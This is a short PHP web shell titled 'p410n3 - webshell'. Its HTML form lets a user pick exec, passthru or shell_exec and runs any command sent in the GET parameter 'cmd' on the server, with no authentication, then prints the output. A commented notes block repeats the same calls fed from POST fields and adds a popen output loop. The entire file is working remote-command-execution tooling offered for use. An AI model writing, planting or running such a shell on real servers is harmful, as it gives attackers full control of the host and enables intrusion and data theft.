<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>p410n3 - webshell</title>
    <style>
        body {
            font-family: Consolas;
        }

        .container {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .form {
            margin-top: 50px;

            display: flex;
            justify-content: center;
        }

        .code {
            margin-top: 30px;
            background-color: black;
            color: green;
            padding: 10px;
            border-radius: 5px;
            font-size: 15px;
        }
    </style>

</head>
<body>
    <div class="container">
        <div class="form">
            <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="get">

                <label for="executioner">Command: </label>
                <select name="executioner" id="executioner">
                    <option value="exec">exec</option>
                    <option value="passthru">passthru</option>
                    <option value="shell_exec">shell_exec</option>
                    <option value="system">system</option>
                    <option value="popen">popen (live!)</option>
                </select>

                <input type="text" name="cmd" placeholder="cmd" id="cmd">
                <button type="submit">RUN</button>
            </form>
        </div>
        <div class="code">
            <pre>
            <?php
                if (isset($_GET["executioner"]) && isset($_GET["cmd"])) {
                    $exec = $_GET["executioner"];
                    $cmd = $_GET["cmd"];

                    switch ($exec) {
                        case "exec":
                            exec($cmd, $out);
                            print_r($out);
                            break;

                        case "passthru":
                            passthru($cmd);
                            break;

                        case "shell_exec":
                            echo shell_exec($cmd);
                            break;
                    }

                }
            ?>
            </pre>
        </div>
    </div>


</body>
</html>
<?php
//notes
/*
passthru($_POST['passthru_cmd']);

system($_POST['system_cmd']);

echo shell_exec($_POST['shell_exec_cmd']);

//start command and output console
$proc = popen($_POST['popen_cmd'], 'r');
while (!feof($proc)) {
echo fread($proc, 4096);
@ flush();
}
pclose($proc);

exec($_POST['exec_cmd'], $out);
print_r($out); */